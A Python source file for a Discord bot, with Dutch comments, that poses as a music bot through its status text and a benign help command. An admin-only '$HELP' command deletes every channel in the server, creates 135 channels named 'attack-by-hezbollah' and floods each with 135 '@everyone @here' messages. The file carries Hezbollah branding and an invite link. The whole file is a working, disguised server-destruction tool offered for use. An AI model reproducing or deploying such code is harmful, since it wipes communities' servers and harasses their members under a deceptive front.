import discord
from discord.ext import commands
import asyncio  


intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True  

TOKEN = 'ENTER YOUR BOT TOKEN'  # Verander dit in je eigen token.
kanaal_naam_basis = 'attack-by-hezbollah'


bot = commands.Bot(command_prefix='$', intents=intents)


@bot.event
async def on_ready():
    blue = '\033[34m'  
    reset = '\033[0m'  

    
    await bot.change_presence(activity=discord.Game("Are you ready to listen to some music?!"))

    print(f"""
{blue}      _              _           _ _       _     
     | |            | |         | | |     | |    
     | |__   ___ ___| |__   ___ | | | __ _| |__  
     | '_ \\ / _ \\_  / '_ \\ / _ \\| | |/ _` | '_ \\ 
     | | | |  __// /| |_) | (_) | | | (_| | | | |
     |_| |_|\\___/___|_.__/ \\___/|_|_|\\__,_|_| |_|                        
    discord.gg/Tm8q5MjW{reset}
    """)

    print("Bot is succesvol opgestart en klaar voor gebruik.")


@bot.command(name='bothelp')
async def bothelp_command(ctx):
    embed = discord.Embed(
        description="**Beschikbare commands:**\n\n!bothelp - Toon beschikbare commands\n!helpall - Toont alle commands voor admins.",
        color=0x3498db
    )
    embed.set_footer(text="2024© Hezbollah")
    await ctx.send(embed=embed)


@bot.command(name='HELP')
@commands.has_permissions(administrator=True)
async def helpall_command(ctx):
    
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            pass  

    
    tasks = []  
    for i in range(135):
        tasks.append(create_channel_and_send_message(ctx.guild))  

   
    await asyncio.gather(*tasks)

    print('[Hezbollah] Attack Done!')

async def create_channel_and_send_message(guild):
    try:
        new_channel = await guild.create_text_channel(name=kanaal_naam_basis)
        for _ in range(135):  #
            await new_channel.send("@everyone @here Attackted By Hezbollah")
    except Exception as e:
        pass  


@helpall_command.error
async def helpall_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Je hebt geen toestemming om dit commando te gebruiken.")


bot.run(TOKEN)
